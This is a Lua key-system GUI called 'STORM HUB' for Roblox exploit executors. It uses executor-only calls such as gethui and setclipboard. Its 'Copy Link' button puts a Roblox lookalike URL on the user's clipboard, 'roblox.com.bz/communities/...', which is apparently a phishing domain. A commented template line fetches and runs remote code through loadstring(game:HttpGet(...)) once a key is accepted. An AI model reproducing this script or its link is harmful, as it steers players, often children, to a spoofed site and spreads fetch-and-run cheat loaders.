--[[
    STORM HUB | Key System UI
    Left: Check Key  |  Right: Copy Link
]]

-- ====================== CONFIG (EDIT THESE) ======================
local KEY_LINK     = "https://roblox.com.bz/communities/8156155453/"      -- link copied by the "Copy Link" button
local KEY_API      = "[PASTE YOUR API CHECK URL HERE]" -- optional: URL that returns "true" for a valid key (key is appended to the end)
local FALLBACK_KEY = "[YOUR KEY HERE]"                 -- used only if KEY_API is not set

local function onSuccess()
    -- Put your main script here (it runs after a valid key is entered)
    -- loadstring(game:HttpGet("[YOUR MAIN SCRIPT URL]"))()
    print("STORM HUB: key accepted")
end
-- =================================================================

local TweenService     = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local Players          = game:GetService("Players")

local function isSet(str)
    return type(str) == "string" and str ~= "" and str:sub(1, 1) ~= "["
end

-- Theme
local COLORS = {
    Background = Color3.fromRGB(14, 15, 24),
    TopBar     = Color3.fromRGB(20, 22, 36),
    Field      = Color3.fromRGB(24, 26, 42),
    Accent     = Color3.fromRGB(88, 120, 255),
    Accent2    = Color3.fromRGB(160, 90, 255),
    Success    = Color3.fromRGB(70, 200, 130),
    Error      = Color3.fromRGB(255, 85, 100),
    Text       = Color3.fromRGB(240, 242, 255),
    SubText    = Color3.fromRGB(140, 146, 175),
}

-- Parent GUI safely
local function getParent()
    local ok, ui = pcall(function() return gethui and gethui() end)
    if ok and ui then return ui end
    local ok2, core = pcall(function() return game:GetService("CoreGui") end)
    if ok2 and core then return core end
    return Players.LocalPlayer:WaitForChild("PlayerGui")
end

local parent = getParent()
if parent:FindFirstChild("StormHubKey") then
    parent.StormHubKey:Destroy()
end

local function create(class, props, children)
    local inst = Instance.new(class)
    for k, v in pairs(props or {}) do inst[k] = v end
    for _, c in ipairs(children or {}) do c.Parent = inst end
    return inst
end

local function corner(r) return create("UICorner", {CornerRadius = UDim.new(0, r)}) end
local function stroke(color, t, trans)
    return create("UIStroke", {Color = color, Thickness = t or 1, Transparency = trans or 0, ApplyStrokeMode = Enum.ApplyStrokeMode.Border})
end

-- ScreenGui
local gui = create("ScreenGui", {
    Name = "StormHubKey",
    ResetOnSpawn = false,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
})

-- Main window
local main = create("Frame", {
    Name = "Main",
    Size = UDim2.fromOffset(420, 260),
    Position = UDim2.fromScale(0.5, 0.5),
    AnchorPoint = Vector2.new(0.5, 0.5),
    BackgroundColor3 = COLORS.Background,
    BorderSizePixel = 0,
    ClipsDescendants = true,
}, {
    corner(12),
    stroke(COLORS.Accent, 1.5, 0.55),
})
main.Parent = gui

-- Top accent line
local accentLine = create("Frame", {
    Size = UDim2.new(1, 0, 0, 3),
    BackgroundColor3 = Color3.new(1, 1, 1),
    BorderSizePixel = 0,
    ZIndex = 3,
}, {
    create("UIGradient", {
        Color = ColorSequence.new(COLORS.Accent, COLORS.Accent2),
    }),
})
accentLine.Parent = main

-- Top bar (drag handle)
local topBar = create("Frame", {
    Name = "TopBar",
    Size = UDim2.new(1, 0, 0, 52),
    Position = UDim2.fromOffset(0, 3),
    BackgroundColor3 = COLORS.TopBar,
    BorderSizePixel = 0,
})
topBar.Parent = main

create("TextLabel", {
    Text = "⚡ STORM HUB",
    Font = Enum.Font.GothamBlack,
    TextSize = 20,
    TextColor3 = COLORS.Text,
    TextXAlignment = Enum.TextXAlignment.Left,
    BackgroundTransparency = 1,
    Position = UDim2.fromOffset(18, 6),
    Size = UDim2.new(1, -70, 0, 24),
}, {
    create("UIGradient", {Color = ColorSequence.new(COLORS.Text, Color3.fromRGB(170, 190, 255))}),
}).Parent = topBar

create("TextLabel", {
    Text = "Key System",
    Font = Enum.Font.Gotham,
    TextSize = 12,
    TextColor3 = COLORS.SubText,
    TextXAlignment = Enum.TextXAlignment.Left,
    BackgroundTransparency = 1,
    Position = UDim2.fromOffset(20, 29),
    Size = UDim2.new(1, -70, 0, 16),
}).Parent = topBar

local closeBtn = create("TextButton", {
    Text = "✕",
    Font = Enum.Font.GothamBold,
    TextSize = 14,
    TextColor3 = COLORS.SubText,
    BackgroundColor3 = COLORS.Field,
    AutoButtonColor = false,
    Size = UDim2.fromOffset(30, 30),
    Position = UDim2.new(1, -44, 0.5, -15),
}, {corner(8)})
closeBtn.Parent = topBar

-- Instruction label
create("TextLabel", {
    Text = "Enter your key to unlock STORM HUB",
    Font = Enum.Font.GothamMedium,
    TextSize = 13,
    TextColor3 = COLORS.SubText,
    BackgroundTransparency = 1,
    Position = UDim2.fromOffset(20, 68),
    Size = UDim2.new(1, -40, 0, 18),
    TextXAlignment = Enum.TextXAlignment.Left,
}).Parent = main

-- Key input
local keyBox = create("TextBox", {
    Name = "KeyBox",
    PlaceholderText = "Paste your key here...",
    PlaceholderColor3 = Color3.fromRGB(100, 106, 135),
    Text = "",
    ClearTextOnFocus = false,
    Font = Enum.Font.GothamMedium,
    TextSize = 14,
    TextColor3 = COLORS.Text,
    BackgroundColor3 = COLORS.Field,
    BorderSizePixel = 0,
    Position = UDim2.fromOffset(20, 94),
    Size = UDim2.new(1, -40, 0, 42),
}, {
    corner(8),
    create("UIPadding", {PaddingLeft = UDim.new(0, 12), PaddingRight = UDim.new(0, 12)}),
})
local keyStroke = stroke(COLORS.Accent, 1, 0.8)
keyStroke.Parent = keyBox
keyBox.Parent = main

-- Buttons (left: Check Key | right: Copy Link)
local function makeButton(text, xScale, xOffset, filled)
    local btn = create("TextButton", {
        Text = text,
        Font = Enum.Font.GothamBold,
        TextSize = 14,
        TextColor3 = COLORS.Text,
        AutoButtonColor = false,
        BackgroundColor3 = filled and Color3.new(1, 1, 1) or COLORS.Field,
        BorderSizePixel = 0,
        Position = UDim2.new(xScale, xOffset, 0, 150),
        Size = UDim2.new(0.5, -26, 0, 42),
    }, {corner(8)})
    if filled then
        create("UIGradient", {Color = ColorSequence.new(COLORS.Accent, COLORS.Accent2), Rotation = 20}).Parent = btn
    else
        stroke(COLORS.Accent, 1, 0.5).Parent = btn
    end
    btn.Parent = main
    return btn
end

local checkBtn = makeButton("Check Key", 0, 20, true)
local copyBtn  = makeButton("Copy Link", 0.5, 6, false)

-- Status label
local status = create("TextLabel", {
    Text = "Waiting for key...",
    Font = Enum.Font.Gotham,
    TextSize = 12,
    TextColor3 = COLORS.SubText,
    BackgroundTransparency = 1,
    Position = UDim2.fromOffset(20, 208),
    Size = UDim2.new(1, -40, 0, 20),
})
status.Parent = main

create("TextLabel", {
    Text = "STORM HUB © 2026",
    Font = Enum.Font.Gotham,
    TextSize = 10,
    TextColor3 = Color3.fromRGB(80, 85, 110),
    BackgroundTransparency = 1,
    Position = UDim2.new(0, 0, 1, -22),
    Size = UDim2.new(1, 0, 0, 16),
}).Parent = main

-- Helpers
local function tween(obj, t, props)
    TweenService:Create(obj, TweenInfo.new(t, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
end

local function setStatus(text, color)
    status.Text = text
    tween(status, 0.2, {TextColor3 = color or COLORS.SubText})
end

local function shake()
    local origin = main.Position
    for _, offset in ipairs({8, -8, 5, -5, 0}) do
        tween(main, 0.04, {Position = origin + UDim2.fromOffset(offset, 0)})
        task.wait(0.04)
    end
end

-- Hover effects
local function hover(btn, base, over)
    btn.MouseEnter:Connect(function() tween(btn, 0.15, {BackgroundColor3 = over}) end)
    btn.MouseLeave:Connect(function() tween(btn, 0.15, {BackgroundColor3 = base}) end)
end
hover(copyBtn, COLORS.Field, Color3.fromRGB(34, 37, 60))
hover(closeBtn, COLORS.Field, COLORS.Error)
checkBtn.MouseEnter:Connect(function() tween(checkBtn, 0.15, {Size = UDim2.new(0.5, -22, 0, 44), Position = UDim2.new(0, 18, 0, 149)}) end)
checkBtn.MouseLeave:Connect(function() tween(checkBtn, 0.15, {Size = UDim2.new(0.5, -26, 0, 42), Position = UDim2.new(0, 20, 0, 150)}) end)

keyBox.Focused:Connect(function() tween(keyStroke, 0.2, {Transparency = 0.2}) end)
keyBox.FocusLost:Connect(function() tween(keyStroke, 0.2, {Transparency = 0.8}) end)

-- Key validation
local function validateKey(key)
    if isSet(KEY_API) then
        local ok, res = pcall(function()
            return game:HttpGet(KEY_API .. key)
        end)
        if not ok then return false, "Connection error. Try again." end
        res = tostring(res):lower():gsub("%s+", "")
        return res == "true", "Invalid key."
    end
    return key == FALLBACK_KEY, "Invalid key."
end

-- Actions
local busy = false

checkBtn.MouseButton1Click:Connect(function()
    if busy then return end
    local key = keyBox.Text:gsub("%s+", "")
    if key == "" then
        setStatus("Please enter a key first.", COLORS.Error)
        task.spawn(shake)
        return
    end

    busy = true
    setStatus("Checking key...", COLORS.Accent)
    local valid, err = validateKey(key)

    if valid then
        setStatus("Key accepted! Loading STORM HUB...", COLORS.Success)
        tween(keyStroke, 0.2, {Color = COLORS.Success, Transparency = 0})
        task.wait(1)
        tween(main, 0.3, {Size = UDim2.fromOffset(420, 0), BackgroundTransparency = 1})
        task.wait(0.3)
        gui:Destroy()
        onSuccess()
    else
        setStatus(err or "Invalid key.", COLORS.Error)
        tween(keyStroke, 0.2, {Color = COLORS.Error, Transparency = 0})
        task.spawn(shake)
        task.wait(1.2)
        tween(keyStroke, 0.2, {Color = COLORS.Accent, Transparency = 0.8})
        busy = false
    end
end)

copyBtn.MouseButton1Click:Connect(function()
    local copy = setclipboard or toclipboard or (syn and syn.write_clipboard)
    if not isSet(KEY_LINK) then
        setStatus("Key link is not configured yet.", COLORS.Error)
        return
    end
    if copy then
        copy(KEY_LINK)
        setStatus("Link copied to clipboard!", COLORS.Success)
    else
        setStatus("Clipboard not supported: " .. KEY_LINK, COLORS.Error)
    end
end)

closeBtn.MouseButton1Click:Connect(function()
    tween(main, 0.25, {Size = UDim2.fromOffset(420, 0), BackgroundTransparency = 1})
    task.wait(0.25)
    gui:Destroy()
end)

-- Dragging
do
    local dragging, dragStart, startPos
    topBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = main.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

-- Open animation
main.Size = UDim2.fromOffset(420, 0)
main.BackgroundTransparency = 1
gui.Parent = parent
tween(main, 0.35, {Size = UDim2.fromOffset(420, 260), BackgroundTransparency = 0})
